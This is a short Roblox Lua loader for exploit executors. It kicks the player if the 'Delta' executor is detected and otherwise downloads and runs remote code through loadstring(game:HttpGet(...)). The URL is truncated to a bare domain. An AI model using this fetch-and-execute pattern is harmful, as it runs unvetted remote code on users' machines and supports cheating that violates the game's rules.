local function isDelta()
    local check = identifyexecutor or getexecutorname or whatexecutor
    if check and string.find(tostring(check()):lower(), "delta") then return true end
    if Delta or delta or _G.Delta or _G.delta or getgenv().Delta or getgenv().delta then return true end
    if getgenv()._delta_core or getgenv().delta_version or getgenv().Delta_Loaded then return true end
    return false
end

if isDelta() then
    game:GetService("Players").LocalPlayer:Kick("executor ini tidak support untuk script ini")
else
    pcall(function()
        loadstring(game:HttpGet("https://githubusercontent.com"))()
    end)
end
